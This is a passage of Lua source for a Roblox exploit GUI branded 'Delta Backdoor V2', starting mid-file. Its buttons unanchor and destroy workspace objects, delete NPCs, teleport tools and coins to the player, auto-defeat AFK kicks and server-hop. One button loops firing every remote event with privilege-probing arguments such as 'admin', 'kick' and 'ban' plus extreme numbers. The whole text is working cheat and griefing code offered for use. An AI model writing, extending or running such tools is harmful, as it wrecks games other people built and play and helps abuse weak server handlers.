    CreateButton("Unanchor Everything", "🔓", function()
        for _, p in pairs(Workspace:GetDescendants()) do
            if p:IsA("BasePart") then
                p.Anchored = false
            end
        end
    end)
    
    CreateButton("Delete All NPCs", "🤖", function()
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("Model") and v:FindFirstChild("Humanoid") and not Players:GetPlayerFromCharacter(v) then
                v:Destroy()
            end
        end
    end)
    
    CreateButton("Bring All Tools", "🔧", function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local pos = LocalPlayer.Character.HumanoidRootPart.Position
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("Tool") or (v:IsA("Model") and v:FindFirstChild("Handle")) then
                    pcall(function()
                        if v:IsA("Tool") then
                            v.Handle.CFrame = CFrame.new(pos)
                        else
                            v.Handle.CFrame = CFrame.new(pos)
                        end
                    end)
                end
            end
        end
    end)
    
    CreateButton("Collect All Coins/Items", "💰", function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            for _, v in pairs(Workspace:GetDescendants()) do
                if v.Name:lower():find("coin") or v.Name:lower():find("cash") or v.Name:lower():find("money") then
                    pcall(function()
                        v.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
                    end)
                end
            end
        end
    end)
    
    CreateButton("Spam Remotes with Args", "📨", function()
        local args = {
            "admin", "owner", "mod", "kick", "ban",
            999999, -999999, math.huge, true, false
        }
        spawn(function()
            while wait(0.1) do
                for _, arg in pairs(args) do
                    FireAllRemotes(arg)
                end
            end
        end)
    end)
    
    CreateButton("Clear Workspace", "🧹", function()
        for _, v in pairs(Workspace:GetChildren()) do
            if not v:IsA("Camera") and not v:IsA("Terrain") and v ~= LocalPlayer.Character then
                pcall(function()
                    v:Destroy()
                end)
            end
        end
    end)
    
    CreateToggle("Anti-AFK", "💤", function(state)
        if state then
            local VirtualUser = game:GetService("VirtualUser")
            LocalPlayer.Idled:Connect(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
        end
    end)
    
    CreateButton("Rejoin Server", "🔄", function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
    end)
    
    CreateButton("Server Hop", "🌐", function()
        local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(
            "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
        ))
        
        for _, server in pairs(servers.data) do
            if server.id ~= game.JobId and server.playing < server.maxPlayers then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
                break
            end
        end
    end)
end)

-- Toggle GUI
ToggleButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
    if MainFrame.Visible then
        Tween(ToggleButton, {Rotation = 180}, 0.3)
        if not currentTab then
            tabs["Destroy"].button.MouseButton1Click:Fire()
        end
    else
        Tween(ToggleButton, {Rotation = 0}, 0.3)
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    Tween(MainFrame, {Size = UDim2.new(0, 0, 0, 0)}, 0.3)
    wait(0.3)
    MainFrame.Visible = false
    MainFrame.Size = UDim2.new(0, 380, 0, 550)
end)

-- Auto-select first tab
wait(0.5)
tabs["Destroy"].button.MouseButton1Click:Fire()

Notify("✅ Delta Backdoor V2 Loaded!")
print("🔥 Delta Backdoor V2 initialized successfully")
